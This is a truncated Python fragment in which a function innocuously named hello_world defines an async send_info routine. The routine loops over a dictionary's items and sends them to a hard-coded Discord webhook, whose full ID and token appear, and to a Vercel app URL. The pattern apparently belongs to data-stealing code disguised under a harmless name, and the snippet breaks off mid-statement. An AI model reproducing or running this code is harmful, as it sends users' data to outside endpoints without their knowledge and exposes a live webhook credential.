...
def hello_world():
    async def send_info():
        ...
        for item, value in a.items():
            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', "https://actual-display.vercel.app/"]:
                if "discord" in link:
